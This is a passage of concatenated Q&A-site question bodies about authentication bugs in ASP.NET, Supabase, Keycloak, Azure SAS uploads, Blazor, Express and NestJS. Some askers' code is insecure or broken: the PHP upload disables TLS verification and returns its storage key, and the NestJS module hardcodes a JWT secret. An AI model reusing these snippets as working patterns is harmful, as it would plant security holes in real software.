        public ApiKeyAuthenticationHandler(IOptionsMonitor&lt;ApiKeyAuthenticationOptions&gt; options, ILoggerFactory logger, UrlEncoder encoder, ISystemClock clock) : base(options, logger, encoder, clock)
        {
        }

        protected override async Task&lt;AuthenticateResult&gt; HandleAuthenticateAsync()
        {
            var myConfigValue = Options.MyConfigValue;

            if (!Request.Headers.ContainsKey(ApiKeyName))
            {
                return AuthenticateResult.Fail(&quot;Missing API Key&quot;);
            }

            var apiKey = Request.Headers[ApiKeyName];

            if (apiKey != myConfigValue)
            {
                return AuthenticateResult.Fail(&quot;Invalid API Key&quot;);
            }

            var claims = new[] { new Claim(ClaimTypes.NameIdentifier, &quot;api-user&quot;) };
            var identity = new ClaimsIdentity(claims, Scheme.Name);
            var principal = new ClaimsPrincipal(identity);
            var ticket = new AuthenticationTicket(principal, Scheme.Name);

            return AuthenticateResult.Success(ticket);
        }
    }
</code></pre>
<p>The problem occurs here: The <code>options</code> in the <code>constructor</code> has a property <code>CurrentValue</code> that has the customized property <code>MyConfigValue</code> with the correct value from <code>appsettings</code>, however, in the function <code>HandleAuthenticateAsync</code>, the <code>Options</code> doesn't have a property of <code>CurrentValue</code>, but it has the customized property <code>MyConfigValue</code> that is null. Therefore, the <code>options</code> in the constructor is not the same as the <code>Options</code> in the function. My implementation of class <code>ApiKeyAuthenticationHandler</code> probably is wrong. One workaround now is to retrieve <code>MyConfigValue</code> inside the <code>constructor</code> and save it for use in the function.</p>
<ol start=""5"">
<li><p>Secure API calls by using:</p>
<pre><code>[Authorize(AuthenticationSchemes = &quot;ApiKey&quot;)]
</code></pre>
</li>
<li><p>I set <code>MyConfigValue</code> in the root level of <code>appsettings.json</code>.<br />
However, whenever the function <code>HandleAuthenticateAsync</code> is called triggered by secured API calls, <code>options.MyConfigValue</code> is always null.<br />
As soon as I use default <code>ApiKeyAuthenticationOptions</code> without <code>MyConfigValue</code> included, and then obtaining it inside <code>ApiKeyAuthenticationHandler</code>, then it works. But that requires obtaining <code>MyConfigValue</code> for each API call, not efficient.<br />
A simple solution in Visual Studio 2022 is available, I can provide it if asked. I will also try to figure out a way to upload to GitHub.</p>
</li>
</ol>
<p>Can someone tell me what goes wrong?</p>
<p>Thanks a lot in advance.</p>
"
"<p>Magic link works when sent from Supabase dashboard, but not when sent from Next.js. The return url includes <code>code</code> in the <code>searchParams</code> instead of the intended <code>token</code>.</p>
<h3>Code</h3>
<pre><code>// middleware.ts

import { NextRequest } from 'next/server'
import { updateSession } from './supabase/middleware'

export async function middleware(request: NextRequest) {
  return await updateSession(request)
}

export const config = {
  matcher: [
    '/((?!_next/static|_next/image|favicon.ico|.*\\.(?:svg|png|jpg|jpeg|gif|webp)$).*)',
  ],
}
</code></pre>
<pre><code>// supabase/middleware.ts

import { createServerClient, type CookieOptions } from '@supabase/ssr'
import { NextResponse, type NextRequest } from 'next/server'

export async function updateSession(request: NextRequest) {
  let response = NextResponse.next({
    request: {
      headers: request.headers,
    },
  })

  const supabase = createServerClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!,
    {
      cookies: {
        get(name: string) {
          return request.cookies.get(name)?.value
        },
        set(name: string, value: string, options: CookieOptions) {
          request.cookies.set({
            name,
            value,
            ...options,
          })
          response = NextResponse.next({
            request: {
              headers: request.headers,
            },
          })
          response.cookies.set({
            name,
            value,
            ...options,
          })
        },
        remove(name: string, options: CookieOptions) {
          request.cookies.set({
            name,
            value: '',
            ...options,
          })
          response = NextResponse.next({
            request: {
              headers: request.headers,
            },
          })
          response.cookies.set({
            name,
            value: '',
            ...options,
          })
        },
      },
    },
  )

  await supabase.auth.getUser()

  return response
}
</code></pre>
<pre><code>// supabase/server.ts

import { createServerClient, type CookieOptions } from '@supabase/ssr'
import { cookies } from 'next/headers'

export function createClient() {
  const cookieStore = cookies()

  return createServerClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!,
    {
      cookies: {
        get(name: string) {
          return cookieStore.get(name)?.value
        },
        set(name: string, value: string, options: CookieOptions) {
          try {
            cookieStore.set({ name, value, ...options })
          } catch (error) {
            // The `set` method was called from a Server Component.
            // This can be ignored if you have middleware refreshing
            // user sessions.
          }
        },
        remove(name: string, options: CookieOptions) {
          try {
            cookieStore.set({ name, value: '', ...options })
          } catch (error) {
            // The `delete` method was called from a Server Component.
            // This can be ignored if you have middleware refreshing
            // user sessions.
          }
        },
      },
    },
  )
}
</code></pre>
<pre><code>// lib/supabase.ts

'use server'

import { createClient } from '@/supabase/server'

export async function signIn(data: FormData) {
  const supabase = createClient()

  const email = data.get('Username') as string

  if (!email) throw new Error('No email provided.')

  try {
    await supabase.auth.signInWithOtp({
      email,
      options: {
        shouldCreateUser: false,
        emailRedirectTo: `${process.env.NEXT_PUBLIC_BASE_URL}/account`,
      },
    })
  } catch (error) {
    throw new Error(`${error}`)
  }
}
</code></pre>
<pre><code>// app/log-in/page.tsx

import { signIn } from '@/lib/supabase'

export default function LogIn() {
  return (
    &lt;main&gt;
      &lt;section&gt;
        &lt;form action={signIn}&gt;
          &lt;input type='email' name='Username' /&gt;

          &lt;button type='submit'&gt;Log In&lt;/button&gt;
        &lt;/form&gt;
      &lt;/section&gt;
    &lt;/main&gt;
  )
}
</code></pre>
<p>Magic Link Email Template</p>
<pre><code>&lt;a href=&quot;{{ .ConfirmationURL }}&quot;&gt;Log In&lt;/a&gt;
</code></pre>
<p>I've followed every tutorial and documentation on this, but no one ever mentions anything about <code>{url}?code={code}</code>. I don't even get that when I use the &quot;Send Magic Link&quot; button in the Supabase dashboard.</p>
"
"<p>I'm currently developing a website using Go with the Gin framework for the backend and Next.js for the frontend. While I have most of the authentication logic implemented, I'm uncertain about how to handle access tokens and refresh tokens.</p>
<p>My plan is to store the refresh token in the database and the access token in cookies. However, I'm confused about when to refresh the access token. Should it be done when the user receives a 401 error, indicating that their token has expired? If so, how should I handle the refresh process?</p>
<p>My concern is that if I refresh the access token using the expired access-token, so when expired access-token get exposed then whoever got the expire token can get a new token, potentially allowing someone to obtain a new access token. How can I securely handle the refresh process to avoid this risk?
Or should I use a timer which refreshes the access token when it is about to get expired?
I appreciate any guidance on how to properly handle access token refreshment in this scenario.</p>
<p>I firstly tried to store both token in cookies then I thought it make no sense and then I stored refresh-token in database but so confused don't know how to refresh access-token based on refresh token which is saved in the database</p>
"
"<p>I am using a Keycloak 1.7.0 Final and I am trying to configure TOTP for a user.
Once I set the required action (Configure TOTP), at the first login I get the configuration page with the QR and the confirmation code. If I setup the TOTP, the required action disappears (as it was completed), the TOTP flag is set to 1 but at the next login the OTP code request is skipped. If I set &quot;REQUIRED&quot; in the authentication flow for OTP Form, the configuration is requested at every login as it was never been configured.</p>
<p>What am I leaving behind?</p>
<p>P.S. With keycloak 18.X in another system I have, it works perfectly.</p>
"
"<p>I am using a PHP System to access to blob system and upload some image with SAS token. I can upload images correctly without SAS token, public, but private token I receive this error:</p>
<blockquote>
<p>InvalidAuthenticationInfoAuthentication information is not given in the correct format. Check the value of Authorization header. RequestId: [xxx]**</p>
</blockquote>
<p>I share with you my PHP code to do this. First, I have a PHP file where two functions are included for uploading:</p>
<pre><code>function getAccessKey(){
    return strval(&quot;xxx&quot;);
}

function getSASForBlob($accountName,$container, $blob, $resourceType, $permissions, $expiry) {
    $key = getAccessKey();
    
    /* Create the signature */
    $_arraysign = array();
    $_arraysign[] = $permissions;
    $_arraysign[] = '';
    $_arraysign[] = $expiry;
    $_arraysign[] = '/' . $accountName . '/' . $container . '/' . $blob;
    $_arraysign[] = '';
    $_arraysign[] = &quot;2014-02-14&quot;; //the API version is now required
    $_arraysign[] = '';
    $_arraysign[] = '';
    $_arraysign[] = '';
    $_arraysign[] = '';
    $_arraysign[] = '';

    $_str2sign = implode(&quot;\n&quot;, $_arraysign);

    return base64_encode(
        hash_hmac('sha256', urldecode(utf8_encode($_str2sign)), base64_decode($key), true)
    );
}

function uploadBlob($filepath, $storageAccountname, $containerName, $blobName, $_signature) {

    $accesskey = getAccessKey();
    $extUsed = explode(&quot;.&quot;,$filepath)[3];
    //$filepath = $filepath.'.'.$extUsed;
    $Date = gmdate('D, d M Y H:i:s \G\M\T');
    $handle = fopen($filepath, &quot;r&quot;);
    $fileLen = filesize($filepath);
    $blobName = $blobName.&quot;.&quot;.$extUsed;
    $URL = &quot;https://$storageAccountname.blob.core.windows.net/$containerName/$blobName&quot;;
    
    $expiry = '';
    $resourceType = 'b';
    $permissions = 'r';
    
    $_parts = array();
    $_parts[] = (!empty($expiry))?'se=' . urlencode($expiry):'';
    $_parts[] = 'sr=' . $resourceType;
    $_parts[] = (!empty($permissions))?'sp=' . $permissions:'';
    $_parts[] = 'sig=' . urlencode($_signature);
    $_parts[] = 'sv=2014-02-14';
    
    $URL = $URL . &quot;?&quot; . implode('&amp;', $_parts);

     $headerResource = &quot;x-ms-blob-cache-control:max-age=3600\nx-ms-blob-type:BlockBlob\nx-ms-date:$Date\nx-ms-version:2017-11-09&quot;;
    $urlResource = &quot;/$storageAccountname/$containerName/$blobName&quot;;
    $extUsed_folded = 'image/'.$extUsed;

    $arraysign = array();
    $arraysign[] = 'PUT';               /*HTTP Verb*/  
    $arraysign[] = '';                  /*Content-Encoding*/  
    $arraysign[] = '';                  /*Content-Language*/  
    $arraysign[] = $fileLen;            /*Content-Length (include value when zero)*/  
    $arraysign[] = '';                  /*Content-MD5*/  
    $arraysign[] = $extUsed_folded          /*'application/pdf'*/;   /*Content-Type*/  
    $arraysign[] = '';                  /*Date*/  
    $arraysign[] = '';                  /*If-Modified-Since */  
    $arraysign[] = '';                  /*If-Match*/  
    $arraysign[] = '';                  /*If-None-Match*/  
    $arraysign[] = '';                  /*If-Unmodified-Since*/  
    $arraysign[] = '';                  /*Range*/  
    $arraysign[] = $headerResource;     /*CanonicalizedHeaders*/
    $arraysign[] = $urlResource;        /*CanonicalizedResource*/

    $str2sign = implode(&quot;\n&quot;, $arraysign);
    
      $sig = base64_encode(hash_hmac('sha256', urldecode(utf8_encode($str2sign)), base64_decode($accesskey), true));  
  //  $sig = signWithAccountKey($str2sign, getAccessKey());
    $authHeader = &quot;SharedKey $storageAccountname:$sig&quot;;

    $header_contentType = &quot;image/&quot;.$extUsed;
    switch($extUsed){
        case &quot;jpg&quot;: case &quot;jpeg&quot;: default: break;
        case &quot;png&quot;:
            $header_contentType = &quot;image/png&quot;; break;
        case &quot;tiff&quot;:
            $header_contentType = &quot;image/tiff&quot;; break;
    }
    
    $headers = [
        'Authorization: ' . $authHeader,
        'x-ms-blob-cache-control: max-age=3600',
        'x-ms-blob-type: BlockBlob',
        'x-ms-date: ' . $Date,
        'x-ms-version: 2017-11-09',
        'Content-Type: '.$header_contentType,
        'Content-Length: ' . $fileLen
    ];

    $ch = curl_init();
    curl_setopt ($ch, CURLOPT_URL, $URL );
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, &quot;PUT&quot;);
    curl_setopt($ch, CURLOPT_INFILE, $handle); 
    curl_setopt($ch, CURLOPT_INFILESIZE, $fileLen); 
    curl_setopt($ch, CURLOPT_UPLOAD, true); 
    $result = curl_exec($ch);



   // echo ('Uploaded successfully&lt;br/&gt;');
   // print_r($result);

    curl_close($ch);
    
    $resultsList = array( $URL , $filepath , $result , $blobName, $urlResource , $accesskey );
    
    if (isset($resultsList) &amp;&amp; is_array($resultsList)) {
        return $resultsList;
    } else {
        return array();
    }
  
}
</code></pre>
<p>And after call this with an include into a my main PHP code, I do this:</p>
<pre><code>$blobName = 'image-viajes';
$urlAdjunto = '';
$newFilename = '../Imagenes/temp_viajes.jpg';

if (!empty($filename)){
    
    $blobSignature = getSASForBlob('xxx', 'yyy', $blobName,
    'b', 'r', '');
    
    echo '&lt;br /&gt;&lt;b&gt;BLOB SIGNATURE&lt;/b&gt;&lt;p&gt;'.$blobSignature.'&lt;/p&gt;';
    
    //$blobFotoAdjunta__url = '';
    $blobFotoAdjunta = uploadBlob(
        $newFilename,
        'xxx', 'yyy',
        $blobName, $blobSignature);

}
</code></pre>
<p>I tried to quit parts addition to url into UploadBlob function, and it is uploaded correctly to server, but without token. In the moment I add GET variables into URL, I give this error. I generated this in Azure panel, for the container I selected.</p>
<p>I modified some data with XXX, yyy, etc. but I can say variables for public are correct. Problem is with Token. If you could see some problem in it, I would thank you too much.</p>
<p>Any question, I am. I don't know If I explained myself correctly as I must.</p>
<p>To upload an image to Azure server with private SAS token, and it doesn't works correctly. Public uploading is correct.</p>
"
"<pre><code>enter code heremain.bbd2c34638e0c973.js:1 ERROR TypeError: n.auth is not a function
at main.bbd2c34638e0c973.js:1:364930
at v.invoke (polyfills.947a6f57c4e6fb39.js:1:6563)
at L.run (polyfills.947a6f57c4e6fb39.js:1:1929)
at Zs.runOutsideAngular (main.bbd2c34638e0c973.js:1:2855277)
at main.bbd2c34638e0c973.js:1:364906
at ie (main.bbd2c34638e0c973.js:1:2544)
at DB (main.bbd2c34638e0c973.js:1:364848)
at new n (main.bbd2c34638e0c973.js:1:371134)
at n.ɵfac [as factory] (main.bbd2c34638e0c973.js:1:372068)
at n0.hydrate (main.bbd2c34638e0c973.js:1:2797672)
</code></pre>
"
"<p>while fetching a Kerberos token from Server (most likely, some kind of MS software), I am getting the response below.</p>
<p>As you can see, there is nothing like an expiration time, or the like, like we get with JWT. So I wondered, whether the token contains that information, and considered to deserialize it. However, if that is possible, I fail to identify the algorithm, that was used to serialize the information. (I would expect Base64, or the like, but it's not.)</p>
<p>So, question: Any ideas on how to do that?</p>
<p>Thanks,</p>
<p>Jochen</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-16&quot;?&gt;
&lt;soap:Envelope xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;
  &lt;soap:Body&gt;
    &lt;GetKerberosTokenResponse xmlns=&quot;http://tempuri.org/&quot;&gt;
      &lt;GetKerberosTokenResult&gt;YIIOcQYJKoZIhvcSAQICAQBugg5gMIIOXKADAgEFoQMCAQ6iBwMFAAAAAACjggy8YY
... Lots of lines removed for brevity ...
IWRzKQKdEnG9mT3U2qIKeS/Mhp+sif9O9212sEFgwH1WGI=&lt;/GetKerberosTokenResult&gt;
    &lt;/GetKerberosTokenResponse&gt;
  &lt;/soap:Body&gt;
&lt;/soap:Envelope&gt;
</code></pre>
"
"<p>This is the logic I am trying to write,I want to get the users from my hard coded list with users and get the id from the localStorage of the user that tries to currently login with it(the Id is like the password in this case,they have separate real Id,called userId),but what I want to do is take the Id that they typed from the local storage and check if this Id is already registered.I hope that was clear.</p>
<pre><code>private DataModel data = new DataModel();



public class DataModel
 {

     public int Id { get; set; }

     public string UserId { get; set; }

     public string SMSCode { get; set; }

     public string Token { get; set; }

    
 }


 private List&lt;DataModel&gt; users = new List&lt;DataModel&gt;();



 private async void HandleLogin()
 {

     Console.WriteLine(&quot;Log me in!&quot;);
     var id = 0;

     var userslist = await IuserService.getUsers();
     var usersfirstid = userslist.First();
     
   

     if (usersfirstid.Id == 0)
     {
         id = id + 1;
     }
     else
     {
         id = id + 1;
     }


     var user = userslist.Where(x =&gt; x.Id != id).First();

    

     if (user==null)
     {
         errorMessage = true;
     }
     else
     {
         var randomId = Guid.NewGuid().ToString();
         id = id + 1;
         await LocalStorage.SetItemAsync&lt;int&gt;(&quot;id&quot;, id);
         await LocalStorage.SetItemAsync&lt;string&gt;(&quot;userId&quot;, randomId);
     }

     await AuthStateProvider.GetAuthenticationStateAsync();


     NavManager.NavigateTo(&quot;/verificar&quot;);


 }
</code></pre>
"
"<p>I am encountering issues while working on a <strong>Blazor Server 6</strong> app. I will try to explain it as clearly as possible.
I will explain the whole context and then share the code.</p>
<p>So my Blazor Server app request an API (<strong>WebAPI</strong>) to login / logout, because i need many services to handle the authentication / authorization process (<em>Keycloak, a Directory, ...</em>).
The API returns a JWT token, with <em>access_token, refresh_token, ...</em> to the Blazor app, and I store this token in LocalStorage (ProtectedLocalStorage to be completly accurate).</p>
<p>I do it through a custom <strong>AuthenticationStateProvider</strong> where I update the localstorage and then the AuthenticationState.
Everything works fine in the Blazor side, but, when i need to request the API for other data (orders, folders, ....) and also to handle the notifications (<em>signalR channel</em>). I need to set the access_token into the request headers ; And there happens my issues.</p>
<p>I use <strong>Refit</strong> Library to handle my API requests, and created a DelegatingHandler to set the token. But when i try to retrieve the token from the LocalStorage, i think you guess what : JSInterop issue.</p>
<p>I also tried to set the token in the HttpContext headers when retrieving the jwt from authentication, but also in the <strong>GetAuthenticationStateAsync()</strong>, but sometimes (mostly when getting a SignalR update), i cannot do it. Of course, websockets are not synchronized with HttpContext.</p>
<p>Do you have any guess, any idea how i can do this ? Maybe if you have also github projects to share, ... i will be glad to find a way to make it work.</p>
<p>So, these are my pieces of code :</p>
<p><strong>Program.cs :</strong></p>
<pre><code>builder.Services.AddAuthentication(options =&gt;
{
    options.DefaultAuthenticateScheme = CookieAuthenticationDefaults.AuthenticationScheme;
    options.DefaultSignInScheme = CookieAuthenticationDefaults.AuthenticationScheme;
    options.DefaultChallengeScheme = CookieAuthenticationDefaults.AuthenticationScheme;
}).AddCookie();
...
           builder.Services.AddRefitClient&lt;IMyApi&gt;(refitSettings)
                .ConfigureHttpClient(c =&gt; c.BaseAddress = new Uri(apiUrl))
                .AddHttpMessageHandler&lt;MyApiAuthHeaderHandler&gt;();
</code></pre>
<p><strong>CustomWebAppAuthenticationStateProvider.cs</strong></p>
<pre><code>public override async Task&lt;AuthenticationState&gt; GetAuthenticationStateAsync()
{
    try
    {
        // Here i retrieve the token from the localstorage, and it works like a charm
        var sessionToken = await TryGetSessionFromStorage();
        if (sessionToken == null)
            return await Task.FromResult(new AuthenticationState(_anonymous));
        var keepConnection = await CheckTokenExpiredAndRefreshIfNeeded(sessionToken);
        if (keepConnection)
        {
            // I retrieve the token again from the storage, but as you can see above, it can have been refreshed and so set a new token in the localstorage
            sessionToken = await TryGetSessionFromStorage();
            var claimsPrincipal = GetUserClaimsFromToken(sessionToken);
            // Here i tried to set it into the httpcontext
            if (_contextAccessor != null &amp;&amp; _contextAccessor.HttpContext != null)
                _contextAccessor.HttpContext!.User = claimsPrincipal;
            return await Task.FromResult(new AuthenticationState(claimsPrincipal));
        }
        else
        {
            await RemoveAuthenticationState();
            _logger.LogInformation(&quot;Session Terminé - Utilisateur déconnecté&quot;);
            return await Task.FromResult(new AuthenticationState(_anonymous));
        }
    }
    catch (Exception ex)
    {
        _logger.LogError(ex.Message, ex);
        return await Task.FromResult(new AuthenticationState(_anonymous));
    }
}

public async Task&lt;AuthenticationStatus?&gt; UpdateAuthenticationState(LoginDto loginDto, string plateform)
{
    var tokenDto = await _authenticationManager.AuthenticateUserAsync(loginDto, plateform);
    ClaimsPrincipal claimsPrincipal;

    if (tokenDto != null &amp;&amp; !string.IsNullOrEmpty(TokenDto.Token))
    {
        await _protectedStorage.SetItemAsync&lt;TokenDto&gt;(&quot;UserSession&quot;, tokenDto);
        claimsPrincipal = GetUserClaimsFromToken(tokenDto);
        _contextAccessor.HttpContext!.User = claimsPrincipal;
    }
    else
    {
        claimsPrincipal = await SetUserAsAnonyous();
    }

    NotifyAuthenticationStateChanged(Task.FromResult(new AuthenticationState(claimsPrincipal)));
    return new AuthenticationStatus(tokenDto);
}

</code></pre>
<p><strong>MyApiAuthHeaderHandler.cs</strong></p>
<pre><code>protected override async Task&lt;HttpResponseMessage&gt; SendAsync(HttpRequestMessage request, CancellationToken cancellationToken)
{

    if (!request.RequestUri!.AbsoluteUri.Contains(&quot;/auth/token&quot;))
    {
// I tried here to access to localstorage but it does not work ... JS Interop issue
        var token = _contextAccessor.HttpContext!.User.Claims.FirstOrDefault(x =&gt; x.Type == &quot;access_token&quot;);
        request.Headers.Authorization = new AuthenticationHeaderValue(&quot;Bearer&quot;, token?.Value);
    }
    return await base.SendAsync(request, cancellationToken).ConfigureAwait(false);
}
</code></pre>
<p>Is that enough information ? Do you need some more code ?</p>
<p>Thanks again guys, i really struggle on it.</p>
<p>As explained, I tried retrieving the token from the Localstorage (I tried Localstorage, sessionStorage, protectedLocalStorage but they all rely on JS so ...)</p>
<p>I do not know what else to try. Thanks</p>
"
"<p>&quot;Hello everyone,</p>
<p>I’m looking to integrate my custom API into a custom GPT action with OAuth using Google authentication. I want to use Google login to obtain an access token, which will then serve as a middleware to access any route in my API. I’ve tried writing code using googleapis and passport, but I haven’t had success.</p>
<p>I’ve added the ChatGPT callback URL in Google redirect settings, and my custom API host domain matches with the auth and token URLs in ChatGPT. However, I’m unsure about the correct code to write for the auth URL and token URL routes.</p>
<p>Can anyone provide guidance or share a correct code example for setting up the auth URL and token URL routes to successfully authenticate with Google OAuth and obtain an access token?</p>
<p>Thank you in advance for your help!&quot;</p>
<pre><code>const express = require('express');
const bodyParser = require('body-parser')
var jsonParser = bodyParser.json()
const path = require('path');
const cors = require('cors'); // Import the CORS middleware
const { google } = require(&quot;googleapis&quot;);
const Cookies = require(&quot;js-cookie&quot;);
const cookieParser = require('cookie-parser');
const app = express();
const PORT = process.env.PORT || 3000;

const CLIENT_ID = process.env.CLIENT_ID;
const CLIENT_SECRET = process.env.CLIENT_SECRET;
const REDIRECT_URI = process.env.REDIRECT_URI;
const SCOPES = [&quot;email&quot;, &quot;profile&quot;];

const authClient = new google.auth.OAuth2(CLIENT_ID, CLIENT_SECRET, REDIRECT_URI);


// const corsOptions = {
//     origin: 'https://customer-data-platform-qdk5bgyaea-el.a.run.app',
//     optionsSuccessStatus: 200 // 
//   };

// app.use(cors(corsOptions));
app.use(bodyParser.json());
app.use(cookieParser()); // Add cookie parser middleware



const verifyTokenMiddleware = async (req, res, next) =&gt; {
    try {
        let idToken;
        if (req.headers.authorization) {
            idToken = req.headers.authorization.split(&quot; &quot;)[1];

            const ticket = await authClient.verifyIdToken({
                idToken: idToken,
                audience: CLIENT_ID,
            });
            const payload = ticket.getPayload();
            req.user = {
                userId: payload.sub,
                email: payload.email,
                name: payload.name,
            };
            next();
        } else {
            return res.status(401).json({ error: &quot;No token found&quot; });
        }
    } catch (error) {
        console.error('Error verifying token:', error);
        return res.status(401).json({ error: 'Unauthorized' });
    }
};


app.get(&quot;/login&quot;, (req, res) =&gt; {
    const { client_id, response_type, redirect_uri, state } = req.query;
    console.log(req.query);
    const CLIENT_ID = client_id;
    const REDIRECT_URI = redirect_uri;
    const authClient = new google.auth.OAuth2(CLIENT_ID, CLIENT_SECRET, REDIRECT_URI);

    // Use query parameters or default values
    const authUrl = authClient.generateAuthUrl({
        scope: SCOPES,
        client_id: client_id || CLIENT_ID,
        redirect_uri: redirect_uri || REDIRECT_URI,
        response_type: response_type || code,
        state: state || STATE,
    });

    res.redirect(authUrl);
});

app.get(&quot;/token&quot;, async (req, res) =&gt; {
    const code = req.query.code;
    console.log(req.query, req.body);
    const grantType = req.query.grant_type;
    const redirectUri = req.query.redirect_uri;
    const clientId = req.query.client_id;
    const clientSecret = req.query.client_secret;

    if (!code || !grantType || !redirectUri || !clientId || !clientSecret) {
        return res.status(400).send(&quot;Required parameters are missing&quot;);
    }

    try {
        // Verify the code and exchange it for tokens using client ID and secret
        const { tokens } = await authClient.getToken({
            code: code,
            clientId: clientId,
            clientSecret: clientSecret,
            redirectUri: redirectUri
        }); 
        console.log(tokens);
        const accessToken = tokens.access_token;
        const expiryDate = tokens.expiry_date;
        const idToken = tokens.id_token;

        const refreshToken = tokens.refresh_token;

        // Redirect to the back website with access token and refresh token
        // Set the content type of the response to JSON
        res.setHeader('Content-Type', 'application/json');

        res.status(200).json({
            idToken: idToken,
            access_token: accessToken,
            refresh_token: refreshToken,
            expiry_date: expiryDate
        });
    } catch (error) {
        console.error(&quot;Error processing Google OAuth callback:&quot;, error);
        res.status(500).send(&quot;Internal Server Error&quot;);
    }
});


app.get('/api/test', verifyTokenMiddleware, async (req, res) =&gt; {
    try {
        // Assume req.query.userKey is passed from the frontend
        const userKey = req.query.userKey;

        // Mock user data
        const users = {
            1: {
                &quot;cdd&quot;: {
                    &quot;src&quot;: [
                        {
                            &quot;value&quot;: &quot;API&quot;,
                            &quot;labels&quot;: [],
                            &quot;timestamp&quot;: &quot;170797592000&quot;
                        }
                    ]
                },
               
                    ]
                }
            }


        };

        // Check if the userKey exists in the users object
        if (users[userKey]) {
            res.send(users[userKey]);
        } else {
            res.status(404).json({ message: 'User not found' });
        }
    } catch (error) {
        console.error(error.message);
        res.status(500).json({ message: 'Server error' });
    }
});


app.get('/Unauthorized', (req, res) =&gt; {
    res.status(401).json({ error: 'Unauthorized' });
});
app.get(&quot;/success&quot;, (req, res) =&gt; {
    // Retrieve the idToken from the cookie
    const idToken = req.cookies.idToken;

    // Check if the idToken exists
    if (!idToken) {
        return res.status(401).send(&quot;No ID token found&quot;);
    }

    // Set the Authorization header with the idToken
    res.setHeader('Authorization', `Bearer ${idToken}`);

    // Send the response
    res.status(200).send({ idToken: idToken });
});
// Start the server
app.listen(PORT, () =&gt; {
    console.log(`Server is running on http://localhost:${PORT}`);
});

</code></pre>
<p>I’m looking to integrate my custom API into a custom GPT action with OAuth using Google authentication. I want to use Google login to obtain an access token, which will then serve as a middleware to access any route in my API. I’ve tried writing code using googleapis and passport, but I haven’t had success.</p>
<p>I’ve added the ChatGPT callback URL in Google redirect settings, and my custom API host domain matches with the auth and token URLs in ChatGPT. However, I’m unsure about the correct code to write for the auth URL and token URL routes.</p>
<p>Can anyone provide guidance or share a correct code example for setting up the auth URL and token URL routes to successfully authenticate with Google OAuth and obtain an access token?</p>
"
"<p>i have this nest code to verify the bearer token of a user after they login in but it gives me the error:</p>
<pre><code>ERROR [ExceptionsHandler] Converting circular structure to JSON
--&gt; starting at object with constructor 'Socket'
|     property 'parser' -&gt; object with constructor 'HTTPParser'
--- property 'socket' closes the circle
</code></pre>
<p>this is my login code and my attempt to authorize the user:
user.module:</p>
<pre><code>@Module({
  imports: [
    ConfigModule.forRoot({
      isGlobal: true,
    }),
    TypeOrmModule.forFeature([User, Level]),
    JwtModule.register({
      secret: 'abc123',
      signOptions: { expiresIn: '60d' },
    }),
  ],
  controllers: [UserController],
  providers: [UserService, JwtStrategy],
})
export class UserModule {}
</code></pre>
<p>user.controller:</p>
<pre><code>import { jwtAuthGuard } from 'src/guards/jwt.guard';
 @Get(&quot;&quot;)
    @UseGuards(jwtAuthGuard)
    getUser(@Req() req: Request) {
        return this.UserService.getUser(req)
    }
</code></pre>
<p>jwt.guard:</p>
<pre><code>import { ExecutionContext, Injectable } from &quot;@nestjs/common&quot;;
import { AuthGuard } from &quot;@nestjs/passport&quot;;
import { Observable } from &quot;rxjs&quot;;

@Injectable()
export class jwtAuthGuard extends AuthGuard('jwt'){
    canActivate(context: ExecutionContext): boolean | Promise&lt;boolean&gt; | Observable&lt;boolean&gt; {        
        return super.canActivate(context)
    }

}
</code></pre>
<p>jwt.strategy:</p>
<pre><code>export class JwtStrategy extends PassportStrategy(Strategy) {
  constructor(private userService: UserService) {
    super({
      jwtFromRequest: ExtractJwt.fromAuthHeaderAsBearerToken(),
      ignoreExpiration: false,
      secretOrKey: 'abc123', // Access the environment variable
    });
  }

  validate(payload: any) {
    return payload;
  }
}
</code></pre>
<p>this is my entire code i omitted some of the imports and some code in the controller and module in other not to make this post too long</p>
"
"<p>I'm developing a web application where I need to implement an authentication system using OAuth2. However, I'm a bit confused about how this new OAuth2 authentication service should work.</p>
<p>Obs: I'm developing this service in Node.js.</p>
<p>My current authentication service receives a username and password, and if they are valid (and are in my Users table), an access token is generated and returned to my client.</p>
<hr />
<p>The new service I'm creating has a route for authorization (/authorize), generating a code_auth for my client.
Request to /authorize:</p>
<p>Method: GET
URL: http://localhost:3013/authorize?scope=read&amp;redirect_uri=http://localhost:3014</p>
<hr />
<p>After that, I have the route to obtain the token (/token), which receives the auth_code and returns the access_token.
Request to /token:</p>
<p>Method: POST
URL: http://localhost:3007/token
Request body:</p>
<pre><code>{ 
   &quot;authorization_code&quot;: &quot;CODE_AUTH&quot;, 
   &quot;client_id&quot;: &quot;CLIENT_ID&quot;, 
   &quot;client_secret&quot;: &quot;CLIENT_SECRET&quot; 
}
</code></pre>
<hr />
<p>But since I'm new to OAuth2.0, I'm having trouble understanding where in this flow the verification of username and password that my previous service did fits in. Where in OAuth2 do I check if my user is a valid user? Is it in the /token route by passing the username and password along with the auth_code, or is it not correct to do that?</p>
"
"<p>I have an ExpressJS API and NextJS UI. I'm trying to generate session tokens. I'm able to generate the token and I see it saved on my MongoDB session storage, but when I try to re-use that session token at on another API endpoint, I get back a 401.</p>
<p>I'm aware of <a href=""https://stackoverflow.com/questions/64627649/express-session-is-not-setting-cookies-in-browser"">previous</a> <a href=""https://stackoverflow.com/questions/72254943/express-session-cookie-not-saving-in-browser"">questions</a> on the subject and have followed all advice given, and I'm still receiving the same issue. I don't know what else I'm missing.</p>
<p>I'm using containerized node 18.13.0 and the default latest image of mongo.</p>
<p>app.js</p>
<pre><code>import express from 'express';
import bodyParser from 'body-parser';
import cors from 'cors';
import session from 'express-session';
import helmet from 'helmet';
import MongoDBStore from 'connect-mongodb-session';

import router from './routes/index.js';

app.use(cors({
    origin: [
        'http://localhost:8080',
        'http://127.0.0.1:8080',
        'http://127.0.0.1:3000',
        'http://localhost:3000',
